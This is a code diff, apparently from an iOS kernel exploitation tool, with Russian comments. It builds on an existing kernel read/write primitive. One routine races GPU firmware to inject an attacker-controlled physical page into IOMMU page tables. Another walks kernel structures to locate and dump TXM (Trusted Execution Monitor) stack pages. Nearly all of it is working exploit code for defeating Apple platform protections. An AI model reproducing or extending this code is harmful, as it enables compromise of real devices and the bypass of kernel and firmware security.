+        if ((op & 0xFC000000) == 0x94000000 || (op & 0xFC000000) == 0x14000000) {
+            int32_t imm = (int32_t)(op & 0x3FFFFFF);
+            if (imm & 0x2000000) imm |= (int32_t)0xFC000000;
+            uint64_t targetCacheVA = funcCacheVA + (uint64_t)i * 4 + ((int64_t)imm << 2);
+            fn = (kp_io_connect_method_fn)(targetCacheVA + slide);
+            break;
+        }
+    }
+    kpGartLive([NSString stringWithFormat:@"  icm v3: liveBase=%#lx cacheBase=%#llx slide=%#llx foff=%#llx ins0=%08x fn=%p",
+                   liveBase, cacheBase, slide, (long long)foff, ins[0], fn]);
+    return fn;
+}
+static uint64_t gRaceBufs[12];
+static int gRaceN = 0;
+static uint64_t gRacePA = 0;
+static volatile int gRaceStop = 0;
+static volatile int gRaceGate = 0;   // флаг: писать ТОЛЬКО в окне жертвы
+
+// одиночный выстрел: состояние жертвы
+static volatile int gSubmitDone = 0;
+static uint64_t gBigVA = 0;
+static id<MTLBuffer> gRaceRes = nil;
+static void *kpVictimSubmit(void *arg)
+{
+    (void)arg;
+    @autoreleasepool {
+        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
+        id<MTLBuffer> big = [mtl newBufferWithLength:0x10000000 options:MTLResourceStorageModePrivate];
+        if (!big) { gSubmitDone = 1; return NULL; }
+        gBigVA = (uint64_t)big.gpuAddress;
+        NSError *err = nil;
+        id<MTLLibrary> lib = [mtl newLibraryWithSource:
+            @"kernel void cp(device ulong *dst [[buffer(0)]], device const ulong *va [[buffer(1)]]) { device const ulong *p = (device const ulong *)(*va); dst[0] = p[0]; }"
+            options:nil error:&err];
+        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"cp"] : nil;
+        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
+        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
+        if (!q) { gSubmitDone = 1; return NULL; }
+        ((volatile uint64_t *)gRaceRes.contents)[0] = 0;
+        ((volatile uint64_t *)gRaceRes.contents)[1] = gBigVA;
+        id<MTLCommandBuffer> cb = [q commandBuffer];
+        id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
+        [enc setComputePipelineState:pipe];
+        [enc setBuffer:gRaceRes offset:0 atIndex:0];
+        [enc setBuffer:gRaceRes offset:16 atIndex:1];
+        [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+        [enc endEncoding];
+        [cb commit];
+        [cb waitUntilCompleted];
+        gSubmitDone = 1;
+    }
+    return NULL;
+}
+
+static void *kpRaceHammer(void *arg)
+{
+    (void)arg;
+    while (!gRaceStop) {
+        if (!gRaceGate) continue;   // вне окна — не корраптим чужие маппинги
+        // только запись[0]: первый слот compaction-заливки
+        kp_rc_kwrite64(gRaceBufs[0] + 8, 1);        // поле1=1 ПЕРВЫМ (count=1)
+        kp_rc_kwrite64(gRaceBufs[0], gRacePA);      // поле0 = paX
+    }
+    return NULL;
+}
+
+// D3 multi-reader: поллит ВСЕ кандидаты, маркер по sigPA
+static uint64_t *gRdPAs = NULL;
+static int gRdNPA = 0;
+static volatile int gRdHits = 0;
+static volatile int gRdStop = 0;
+static int gRdWinCand = -1;
+static uint64_t gRdCands[24];
+static int gRdNCand = 0;
+static volatile unsigned gRdLogN = 0;
+static int gRdLogC[512], gRdLogI[512];
+static uint64_t gRdLogV0[512];
+static void *kpListReaderMulti(void *arg)
+{
+    (void)arg;
+    while (!gRdStop) {
+        for (int c = 0; c < gRdNCand; c++) {
+            uint64_t bv = gRdCands[c];
+            for (int i = 0; i < 64; i++) {
+                uint64_t f0 = kp_rc_kread64(bv + (uint64_t)i * 0x10);
+                if (!f0) continue;
+                // логируем ВСЕ ненулевые (cap 512)
+                unsigned slot = gRdLogN;
+                if (slot < 512) {
+                    gRdLogC[slot] = c; gRdLogI[slot] = i; gRdLogV0[slot] = f0;
+                    gRdLogN = slot + 1;
+                }
+                for (int j = 0; j < gRdNPA; j++) {
+                    if (f0 == gRdPAs[j]) {
+                        gRdHits++;
+                        if (gRdWinCand < 0) gRdWinCand = c;
+                        kpGartLive([NSString stringWithFormat:@"    ПОПАДАНИЕ: cand[%d] rec[%d] поле0=%#llx == sigPA[%d]", c, i, f0, j]);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    return NULL;
+}
+
++ (NSString *)gartProbeReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"] error:nil];
+    gGartLive = YES;
+    GNOTE( @"=== GART descriptor hunt (registry walk, RE-цепочка) ===");
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        gGartLive = NO;
+        return r;
+    }
+    extern uint64_t kp_rc_kread64(uint64_t);
+    extern void kp_rc_kwrite64(uint64_t, uint64_t);
+
+    // === RACE через Metal-носитель: sel9-война закрыта (формат входа не
+    //     пробивается), носитель = обычный Metal submit-цикл (D3v2: 512
+    //     записей в листе за submit). Детектор = скан 0x17-страниц на paX:
+    //     базовый ДО (отсутствует) → молот во время цикла → скан ПОСЛЕ
+    //     (найден = FW замапил наш phys = ИНЪЕКЦИЯ).
+    extern uint64_t kp_rc_kread64(uint64_t);
+    extern uint64_t vtophys(uint64_t, uint64_t);
+
+    // 1. bufVA (compacted list) + ttep + сентинель paX
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
+    if (!svc) { GNOTE( @"FAIL: сервис IOGPU"); gGartLive = NO; return r; }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+    IOObjectRelease(svc);
+    if (kr || !conn) { GNOTE( @"FAIL: open"); gGartLive = NO; return r; }
+    uint64_t kc = kconstant(base);
+    uint64_t slide = kc - 0xfffffff007004000ULL;
+    uint64_t cpuData = 0xfffffff00aa44000ULL + slide;
+    uint64_t slotBase = 0xfffffff00aa48000ULL + slide;
+    uint64_t bufVA = kp_rc_kread64(slotBase + (kp_rc_kread64(cpuData + 0x1a0) >> 16) + 8);
+    GNOTE( [NSString stringWithFormat:@"  slide=%#llx bufVA=%#llx", slide, bufVA]);
+    if (!kpLooksLikeKernelPointer(bufVA)) { GNOTE( @"FAIL: bufVA"); gGartLive = NO; return r; }
+
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; gGartLive = NO; return r; }
+    mach_port_t tp = mach_thread_self();
+    uint64_t tva = [self rcResolveThreadKVA:tp];
+    mach_port_deallocate(mach_task_self(), tp);
+    uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
+    uint64_t sproc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
+    uint64_t pro = kp_untag_ptr(kp_rc_kread64(sproc + off_proc_p_proc_ro));
+    uint64_t stask = kp_untag_ptr(kp_rc_kread64(pro + off_proc_ro_pr_task));
+    uint64_t smap = kp_untag_ptr(kp_rc_kread64(stask + off_task_map));
+    uint64_t spmap = kp_untag_ptr(kp_rc_kread64(smap + koffsetof(vm_map, pmap)));
+    uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
+    vm_address_t svx = 0;
+    if (vm_allocate(mach_task_self(), &svx, 0x4000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
+        mlock((void *)svx, 0x4000) != 0) { GNOTE( @"FAIL: vm_alloc/mlock"); gGartLive = NO; return r; }
+    memset((void *)svx, 0, 0x4000);
+    *(volatile uint64_t *)svx = 0x4142434445464748ULL;
+    uint64_t paX = vtophys(ttep, svx);
+    GNOTE( [NSString stringWithFormat:@"  сентинель: svx=%#llx paX=%#llx маркер=0x4142434445464748", (uint64_t)svx, paX]);
+    if (!paX) { GNOTE( @"FAIL: vtophys"); gGartLive = NO; return r; }
+
+    // 2. frame table + список 0x17-страниц
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+    if (!tableVA) { GNOTE( @"FAIL: frame table"); gGartLive = NO; return r; }
+    uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
+    uint32_t totalPages = (uint32_t)(ps >> 14);
+    uint32_t *iommuPages = malloc((size_t)totalPages * 4);
+    if (!iommuPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
+    uint32_t niommu = 0;
+    {
+        uint8_t fch[0x1000];
+        for (uint32_t base2 = 0; base2 < totalPages; base2 += 256) {
+            uint32_t n = totalPages - base2; if (n > 256) n = 256;
+            kreadbuf(tableVA + (uint64_t)base2 * 16, fch, (size_t)n * 16);
+            for (uint32_t j = 0; j < n; j++)
+                if (fch[j * 16 + 2] == 0x17) iommuPages[niommu++] = base2 + j;
+        }
+    }
+    GNOTE( [NSString stringWithFormat:@"  0x17-страниц: %u", niommu]);
+
+    // 3. БАЗОВЫЙ скан 0x17 на paX (ожидаем 0)
+    int baseHits = 0;
+    for (uint32_t i = 0; i < niommu; i++) {
+        uint64_t pa = pb + ((uint64_t)iommuPages[i] << 14);
+        uint64_t pva = gPrimitives.phystokv(pa);
+        uint8_t pgch[0x1000];
+        for (int seg = 0; seg < 4; seg++) {
+            kreadbuf(pva + (uint64_t)seg * 0x1000, pgch, 0x1000);
+            for (int q = 0; q < 512; q++) {
+                uint64_t v;
+                memcpy(&v, pgch + q * 8, 8);
+                if ((v & 0xFFFFFFFFF000ULL) == paX) baseHits++;
+            }
+        }
+    }
+    GNOTE( [NSString stringWithFormat:@"  БАЗА: paX в 0x17 ДО гонки: %d %@", baseHits, baseHits ? @"(уже там?!)" : @"= 0, чисто"]);
+
+    // 4. ЛОВЛЯ ПЕРЕХОДОВ: протухшие записи не чистятся между пачками —
+    //    «ненулево» ≠ «fill идёт». Ловим СМЕНУ значения записи[0] (новая
+    //    пачка началась) и пишем мгновенно: окно = fill пачки → c4.
+    gSubmitDone = 0;
+    {
+        id<MTLDevice> mtl0 = MTLCreateSystemDefaultDevice();
+        gRaceRes = mtl0 ? [mtl0 newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
+        if (!gRaceRes) { GNOTE( @"FAIL: res buffer"); gGartLive = NO; return r; }
+    }
+    pthread_t vt;
+    pthread_create(&vt, NULL, kpVictimSubmit, NULL);
+    int writes = 0, transitions = 0;
+    uint64_t prev = kp_rc_kread64(bufVA);
+    while (!gSubmitDone && writes < 50) {
+        uint64_t f0 = kp_rc_kread64(bufVA);
+        if (f0 != prev && f0) {
+            transitions++;                       // пачка началась
+            kp_rc_kwrite64(bufVA + 8, 1);          // qword1=1 сначала
+            kp_rc_kwrite64(bufVA, paX);            // qword0 = paX
+            writes++;
+            prev = f0;
+        }
+    }
+    pthread_join(vt, NULL);
+    GNOTE( [NSString stringWithFormat:@"  ловля переходов: %d переходов, %d записей", transitions, writes]);
+
+    // read-back: что шейдер прочитал по gvaB[0] большого буфера
+    uint64_t got = 0;
+    if (gRaceRes) got = ((volatile uint64_t *)gRaceRes.contents)[0];
+    GNOTE( [NSString stringWithFormat:@"  read-back gvaB=%#llx[0] → %#llx %@", gBigVA, got,
+               got == 0x4142434445464748ULL ? @"★★★ FW ЗАМАПИЛ НАШ phys — GPU ЧИТАЕТ ЕГО! ★★★" : @"(не маркер)"]);
+
+
+    // 5. ПОСТ-скан 0x17 на paX
+    int postHits = 0;
+    for (uint32_t i = 0; i < niommu; i++) {
+        uint64_t pa = pb + ((uint64_t)iommuPages[i] << 14);
+        uint64_t pva = gPrimitives.phystokv(pa);
+        uint8_t pgch[0x1000];
+        for (int seg = 0; seg < 4; seg++) {
+            kreadbuf(pva + (uint64_t)seg * 0x1000, pgch, 0x1000);
+            for (int q = 0; q < 512; q++) {
+                uint64_t v;
+                memcpy(&v, pgch + q * 8, 8);
+                if ((v & 0xFFFFFFFFF000ULL) == paX) {
+                    postHits++;
+                    if (postHits <= 8)
+                        GNOTE( [NSString stringWithFormat:@"★ paX В PTE: page=%#llx slot=%d val=%#llx", pa, seg * 512 + q, v]);
+                }
+            }
+        }
+    }
+    GNOTE( [NSString stringWithFormat:@"  ПОСТ: paX в 0x17 ПОСЛЕ гонки: %d %@", postHits,
+               postHits > baseHits ? @"★★★ ИНЪЕКЦИЯ ДОКАЗАНА — FW ЗАМАПИЛ НАШ phys! ★★★" : @"— не ловим (окно/тайминг)"]);
+    free(iommuPages);
+    munlock((void *)svx, 0x4000);
+    vm_deallocate(mach_task_self(), svx, 0x4000);
+    gGartLive = NO;
+    return r;
+}
+
+
+
+
+#pragma mark - D1: TXM stack + frame-type recon (kread-only)
+
+// Frame type of the page backing a kernel VA. -1 when untranslatable.
+static int kpVAType(uint64_t va, uint64_t tableVA)
+{
+    if (!kpLooksLikeKernelPointer(va)) return -1;
+    errno = 0;
+    uint64_t pa = kvtophys(va);
+    if (!pa || !kpPAIsManaged(pa)) return -1;
+    return kpFrameTypeOfPAQuiet(tableVA, pa);
+}
+
++ (NSString *)txmStackReconReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== D1: разведка TXM stack в thread_t + калибровка frame types (kread-only, безопасно) ===\n"];
+    if (!gPrimitives.kreadbuf) { [r appendString:@"KRW не жив — сначала эксплойт.\n"]; return r; }
+
+    // 1. Frame table (proved EL1-readable in E1-E3).
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+    if (!tableVA) { [r appendString:@"FAIL: frame table недоступна\n"]; return r; }
+
+    // 2. self proc → task (standard chain). findProcByCommName ONLY — the
+    //    EXP-01 candidate walk behind findSelfProcByComm/findProcByPid burns
+    //    thousands of kreads through garbage chains and dies on a per-cpu
+    //    zone bound check (this exact panic, zalloc.c:1308).
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProofV2" log:r];
+    if (!selfProc) { [r appendString:@"FAIL: self proc не найден fast walk'ом\n"]; return r; }
+    uint64_t procRo = 0, selfTask = 0;
+    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRo, 8, "self proc_ro", r)) return r;
+    procRo = kp_untag_ptr(procRo);
+    if (!kpRead(procRo + off_proc_ro_pr_task, &selfTask, 8, "self task", r)) return r;
+    selfTask = kp_untag_ptr(selfTask);
+    if (!kpLooksLikeKernelPointer(selfTask)) { [r appendString:@"FAIL: self task\n"]; return r; }
+    kpNote(r, [NSString stringWithFormat:@"  self: proc=%#llx task=%#llx", selfProc, selfTask]);
+
+    // 3. Our thread port → itk_space → is_table (SMR) → entry → ie_object →
+    //    ip_kobject → thread_t (the E10 ladder, proven on-device).
+    mach_port_t tport = mach_thread_self();
+    uint64_t spaceRaw = 0, itkSpace = 0, tableRaw = 0, table = 0;
+    if (!kpRead(selfTask + off_task_itk_space, &spaceRaw, 8, "task.itk_space", r)) return r;
+    itkSpace = kp_untag_ptr(spaceRaw);
+    if (!kpRead(itkSpace + off_ipc_space_is_table, &tableRaw, 8, "is_table", r)) return r;
+    if (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+        table = kp_untag_ptr(kpSMRDecode(tableRaw));
+    else
+        table = kp_untag_ptr(tableRaw);
+    if (!kpLooksLikeKernelPointer(table)) { [r appendString:@"FAIL: is_table\n"]; return r; }
+    uint64_t entryVA = table + (uint64_t)sizeof_ipc_entry * (tport >> 8);
+    uint64_t objRaw = 0;
+    if (!kpRead(entryVA + off_ipc_entry_ie_object, &objRaw, 8, "ie_object", r)) return r;
+    uint64_t portVA = kp_untag_ptr(objRaw);
+    if (!kpLooksLikeKernelPointer(portVA)) { [r appendString:@"FAIL: ie_object\n"]; return r; }
+    uint64_t kobjRaw = 0;
+    if (!kpRead(portVA + off_ipc_port_ip_kobject, &kobjRaw, 8, "ip_kobject", r)) return r;
+    uint64_t threadVA = kp_untag_ptr(kobjRaw);
+    kpNote(r, [NSString stringWithFormat:@"  thread port %#x → ipc_port=%#llx → thread_t=%#llx",
+              (unsigned)tport, (unsigned long long)portVA, (unsigned long long)threadVA]);
+    mach_port_deallocate(mach_task_self(), tport);
+    if (!kpLooksLikeKernelPointer(threadVA)) { [r appendString:@"FAIL: thread_t не kernel VA\n"]; return r; }
+
+    // 4. Anchor frame types (calibrates the enum against known roles).
+    [r appendString:@"\n  --- калибровка типов по якорям ---\n"];
+    struct { const char *role; uint64_t va; } anchors[8];
+    int na = 0;
+    anchors[na].role = "kernel text (base)"; anchors[na].va = kconstant(base); na++;
+    anchors[na].role = "frame table (сама)"; anchors[na].va = tableVA; na++;
+    anchors[na].role = "наш proc (heap)"; anchors[na].va = selfProc; na++;
+    anchors[na].role = "наш task"; anchors[na].va = selfTask; na++;
+    anchors[na].role = "наш thread_t"; anchors[na].va = threadVA; na++;
+    uint64_t ucredVA = 0;
+    if (kpRead(procRo + koffsetof(proc_ro, ucred), &ucredVA, 8, "proc_ro.ucred", r)) {
+        ucredVA = kp_untag_ptr(ucredVA);
+        if (kpLooksLikeKernelPointer(ucredVA)) { anchors[na].role = "наш ucred (RO?)"; anchors[na].va = ucredVA; na++; }
+    }
+    // our userland page through our own pmap chain
+    uint64_t map = 0, pmap = 0, ttep = 0;
+    kpRead(selfTask + off_task_map, &map, 8, "task.map", r);
+    map = kp_untag_ptr(map);
+    kpRead(map + koffsetof(vm_map, pmap), &pmap, 8, "map.pmap", r);
+    pmap = kp_untag_ptr(pmap);
+    kpRead(pmap + koffsetof(pmap, ttep), &ttep, 8, "pmap.ttep", r);
+    ttep = kp_untag_ptr(ttep);
+    uint8_t *upage = valloc(0x4000);
+    memset(upage, 0x41, 0x4000);
+    for (int i = 0; i < na; i++) {
+        int t = kpVAType(anchors[i].va, tableVA);
+        kpNote(r, [NSString stringWithFormat:@"    %-22s VA=%#llx type=%@",
+                  anchors[i].role, (unsigned long long)anchors[i].va,
+                  t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x%@", t,
+                     (gHeapTypeKnown && t == gHeapFrameType) ? @" (XNU_DEFAULT)" : @""]]);
+    }
+    if (ttep) {
+        uint64_t upa = vtophys(ttep, (uint64_t)upage);
+        int t = upa ? kpFrameTypeOfPAQuiet(tableVA, upa) : -1;
+        kpNote(r, [NSString stringWithFormat:@"    %-22s VA=%#llx PA=%#llx type=%@",
+                  "userland malloc стр.", (unsigned long long)(uint64_t)upage, (unsigned long long)upa,
+                  t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t]]);
+    }
+    free(upage);
+
+    // 5. thread_t pointer scan: every kernel-VA field + its page's frame type.
+    //    The TXM stack is the one with type 0x2a — no offset table needed.
+    [r appendString:@"\n  --- скан thread_t (0x1000 байт): kernel VA + frame type ---\n"];
+    uint32_t tsz = 0x1000;
+    uint8_t *tbuf = malloc(tsz);
+    memset(tbuf, 0, tsz);
+    int txmOff = -1;
+    NSMutableSet *before = [NSMutableSet set];
+    if (kpRead(threadVA, tbuf, tsz, "thread_t dump", r)) {
+        for (uint32_t o = 0; o + 8 <= tsz; o += 8) {
+            uint64_t q = 0;
+            memcpy(&q, tbuf + o, 8);
+            uint64_t va = kp_untag_ptr(q);
+            if (!kpLooksLikeKernelPointer(va)) continue;
+            [before addObject:@(va)];
+            int t = kpVAType(va, tableVA);
+            NSString *tag = @"";
+            if (t == 0x2a) { tag = @" ← КАНДИДАТ TXM STACK (type 0x2a)"; txmOff = (int)o; }
+            kpNote(r, [NSString stringWithFormat:@"    +0x%03x: %#llx type=%@%@",
+                      o, (unsigned long long)va,
+                      t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t], tag]);
+        }
+    }
+
+    // 6. csops forces a TXM round-trip on this thread — rescan for NEW kernel
+    //    VAs (the TXM stack is associated lazily on the first TXM call).
+    kpNote(r, @"  csops(self, CS_OPS_STATUS) — форсирую TXM-вызов на этом треде…");
+    extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
+    uint32_t csbuf[4] = {0};
+    int csres = csops(getpid(), 0, csbuf, sizeof(csbuf));
+    kpNote(r, [NSString stringWithFormat:@"  csops → %d (flags=0x%x) — повторный скан thread_t", csres, csbuf[0]]);
+    memset(tbuf, 0, tsz);
+    if (kpRead(threadVA, tbuf, tsz, "thread_t dump #2", r)) {
+        int newCnt = 0;
+        for (uint32_t o = 0; o + 8 <= tsz; o += 8) {
+            uint64_t q = 0;
+            memcpy(&q, tbuf + o, 8);
+            uint64_t va = kp_untag_ptr(q);
+            if (!kpLooksLikeKernelPointer(va)) continue;
+            if ([before containsObject:@(va)]) continue;
+            int t = kpVAType(va, tableVA);
+            NSString *tag = @"";
+            if (t == 0x2a) { tag = @" ← TXM STACK (type 0x2a, появился после csops)"; txmOff = (int)o; }
+            kpNote(r, [NSString stringWithFormat:@"    NEW +0x%03x: %#llx type=%@%@",
+                      o, (unsigned long long)va,
+                      t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t], tag]);
+            newCnt++;
+        }
+        if (!newCnt) kpNote(r, @"    новых kernel VA после csops нет (TXM stack либо уже был, либо вызов не дошёл до TXM)");
+    }
+    free(tbuf);
+
+    // 7. Whole-RAM type sweep + TXM-cluster hunt: collect PAs of all pages
+    //    typed 38..62 (TXM/SK domains), then dense-scan ±512 FTE around each
+    //    for the elusive 0x2a (TXM stack).
+    [r appendString:@"\n  --- развёртка всей RAM (каждая 64-я страница) ---\n"];
+    NSMutableArray<NSNumber *> *txmPAs = [NSMutableArray array];
+    {
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        uint64_t samples = totalPages / 64;
+        NSCountedSet *hist = [NSCountedSet set];
+        int t0 = 0, t2a = 0;
+        for (uint64_t i = 0; i < samples; i++) {
+            uint64_t fte = tableVA + (i * 64) * 16;
+            uint8_t ent[16];
+            memset(ent, 0, sizeof(ent));
+            kreadbuf(fte, ent, 16);
+            [hist addObject:@(ent[2])];
+            uint64_t pa = kconstant(physBase) + (i * 64) * 0x4000;
+            if (ent[2] >= 38 && ent[2] <= 62) [txmPAs addObject:@(pa)];
+            if (ent[2] == 0 && t0 < 12) {
+                t0++;
+                kpNote(r, [NSString stringWithFormat:@"    ТИП 0 @ PA=%#llx FTE: guard=%04x level=%u owner=%02x",
+                          (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
+            }
+            if (ent[2] == 0x2a && t2a < 12) {
+                t2a++;
+                kpNote(r, [NSString stringWithFormat:@"    ТИП 0x2a (TXM stack) @ PA=%#llx FTE: guard=%04x level=%u owner=%02x",
+                          (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
+            }
+        }
+        NSMutableArray *parts = [NSMutableArray array];
+        for (NSNumber *t in [[hist allObjects] sortedArrayUsingSelector:@selector(compare:)])
+            [parts addObject:[NSString stringWithFormat:@"0x%02x×%lu", t.unsignedCharValue, (unsigned long)[hist countForObject:t]]];
+        kpNote(r, [NSString stringWithFormat:@"  гистограмма всей RAM (%llu сэмплов): %@", (unsigned long long)samples, [parts componentsJoinedByString:@" "]]);
+        kpNote(r, [NSString stringWithFormat:@"  тип 0: %d показано · тип 0x2a: %d показано · TXM/SK-страниц (38-62): %lu", t0, t2a, (unsigned long)txmPAs.count]);
+    }
+
+    // 7b. Dense scan around every TXM/SK-typed page.
+    NSMutableArray<NSNumber *> *stack2aPAs = [NSMutableArray array];
+    if (txmPAs.count) {
+        kpNote(r, [NSString stringWithFormat:@"  --- доскан ±512 FTE вокруг %lu TXM/SK страниц на 0x2a ---", (unsigned long)txmPAs.count]);
+        int found2a = 0;
+        for (NSNumber *paNum in txmPAs) {
+            uint64_t pa = paNum.unsignedLongLongValue;
+            uint64_t center = (pa - kconstant(physBase)) >> 14;
+            NSCountedSet *local = [NSCountedSet set];
+            for (int64_t d = -512; d <= 512; d++) {
+                int64_t idx = (int64_t)center + d;
+                if (idx < 0) continue;
+                uint8_t ent[16];
+                memset(ent, 0, sizeof(ent));
+                kreadbuf(tableVA + (uint64_t)idx * 16, ent, 16);
+                [local addObject:@(ent[2])];
+                if (ent[2] == 0x2a && found2a < 16) {
+                    found2a++;
+                    uint64_t fpa = kconstant(physBase) + (uint64_t)idx * 0x4000;
+                    if (stack2aPAs.count < 8) [stack2aPAs addObject:@(fpa)];
+                    kpNote(r, [NSString stringWithFormat:@"    0x2a НАЙДЕНА @ PA=%#llx (кластер около PA=%#llx): guard=%04x level=%u owner=%02x",
+                              (unsigned long long)fpa, (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
+                }
+            }
+            NSMutableArray *lp = [NSMutableArray array];
+            for (NSNumber *t in [[local allObjects] sortedArrayUsingSelector:@selector(compare:)])
+                [lp addObject:[NSString stringWithFormat:@"0x%02x×%lu", t.unsignedCharValue, (unsigned long)[local countForObject:t]]];
+            kpNote(r, [NSString stringWithFormat:@"    кластер PA=%#llx: %@", (unsigned long long)pa, [lp componentsJoinedByString:@" "]]);
+        }
+        kpNote(r, [NSString stringWithFormat:@"  доскан: страниц 0x2a найдено: %d", found2a]);
+    }
+
+    // 7c. Dump the TXM stack pages themselves (physmap read — reads don't fault).
+    for (NSNumber *paNum in stack2aPAs) {
+        uint64_t pa = paNum.unsignedLongLongValue;
+        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+        if (!kva) continue;
+        uint8_t sb[0x100];
+        memset(sb, 0, sizeof(sb));
+        if (!kpRead(kva, sb, sizeof(sb), "txm stack dump", r)) continue;
+        int nz = 0;
+        for (uint32_t o = 0; o + 8 <= sizeof(sb); o += 8) {
+            uint64_t q = 0;
+            memcpy(&q, sb + o, 8);
+            if (q) {
+                nz++;
+                kpNote(r, [NSString stringWithFormat:@"    0x2a PA=%#llx +0x%02x: %#018llx",
+                          (unsigned long long)pa, o, (unsigned long long)q]);
+            }
+        }
+        if (!nz) kpNote(r, [NSString stringWithFormat:@"    0x2a PA=%#llx: первые 0x100 байт нулевые (стек свободен/очищен)", (unsigned long long)pa]);
+    }
+
+    // 8. ALL our threads via task_threads: read thread+0x530 (TXM
+    //    association, from txm_kernel_call_internal @ 0x8502ce0) and +0x4a0
+    //    (CAS token) of each. Also empirically locate task->threads by
+    //    finding a queue head in task pointing into a known thread_t.
+    [r appendString:@"\n  --- все наши треды: поле +0x530 (TXM association) ---\n"];
+    {
+        thread_act_array_t actList = NULL;
+        mach_msg_type_number_t actCount = 0;
+        kern_return_t kr = task_threads(mach_task_self(), &actList, &actCount);
+        if (kr != KERN_SUCCESS || !actList) {
+            kpNote(r, [NSString stringWithFormat:@"  task_threads failed: %d", kr]);
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  тредов в процессе: %u", (unsigned)actCount]);
+            uint64_t firstThreadVA = 0;
+            for (mach_msg_type_number_t i = 0; i < actCount; i++) {
+                mach_port_t tp = actList[i];
+                uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (tp >> 8);
+                uint64_t oRaw = 0, kRaw = 0;
+                if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "thr ie_object", r)) continue;
+                uint64_t pVA = kp_untag_ptr(oRaw);
+                if (!kpLooksLikeKernelPointer(pVA)) continue;
+                if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "thr ip_kobject", r)) continue;
+                uint64_t tVA = kp_untag_ptr(kRaw);
+                if (!kpLooksLikeKernelPointer(tVA)) continue;
+                if (!firstThreadVA) firstThreadVA = tVA;
+                uint64_t assoc = 0;
+                uint32_t casTok = 0;
+                kreadbuf(tVA + 0x530, &assoc, 8);
+                kreadbuf(tVA + 0x4a0, &casTok, 4);
+                uint64_t assocU = kp_untag_ptr(assoc);
+                int tAssoc = kpLooksLikeKernelPointer(assocU) ? kpVAType(assocU, tableVA) : -1;
+                kpNote(r, [NSString stringWithFormat:@"    thread[%u] port=%#x thread_t=%#llx +0x530=%#llx%@ casTok=%#x",
+                          (unsigned)i, (unsigned)tp, (unsigned long long)tVA, (unsigned long long)assoc,
+                          assoc ? [NSString stringWithFormat:@" (untag %#llx type=%@)", (unsigned long long)assocU,
+                                   tAssoc < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tAssoc]] : @"",
+                          (unsigned)casTok]);
+            }
+            // task->threads empirical: qword in task pointing into firstThreadVA..+0x1000
+            if (firstThreadVA) {
+                uint32_t tsz2 = 0x800;
+                uint8_t *tb = malloc(tsz2);
+                memset(tb, 0, tsz2);
+                if (kpRead(selfTask, tb, tsz2, "task scan for threads queue", r)) {
+                    for (uint32_t o = 0; o + 16 <= tsz2; o += 8) {
+                        uint64_t q = 0;
+                        memcpy(&q, tb + o, 8);
+                        uint64_t va = kp_untag_ptr(q);
+                        if (va >= firstThreadVA && va < firstThreadVA + 0x1000) {
+                            kpNote(r, [NSString stringWithFormat:@"    task+%#x: %#llx → внутри thread_t[0] (+%#llx) — кандидат threads queue (link offset +%#llx)",
+                                      o, (unsigned long long)va, (unsigned long long)(va - firstThreadVA), (unsigned long long)(va - firstThreadVA)]);
+                        }
+                    }
+                }
+                free(tb);
+            }
+            for (mach_msg_type_number_t i = 0; i < actCount; i++)
+                mach_port_deallocate(mach_task_self(), actList[i]);
+            vm_deallocate(mach_task_self(), (vm_address_t)actList, actCount * sizeof(mach_port_t));
+        }
+    }
+
+    [r appendFormat:@"\n=== D1 ИТОГ: txm stack offset в thread_t = %@ ===\n",
+        txmOff >= 0 ? [NSString stringWithFormat:@"0x%x (type 0x2a подтверждён)", txmOff]
+                    : @"не найден (см. скан выше; если type 0x2a нет — TXM stack не ассоциирован с этим тредом)"];
+
+    // 9. csops variants: read-only-ish opcodes that might route through TXM.
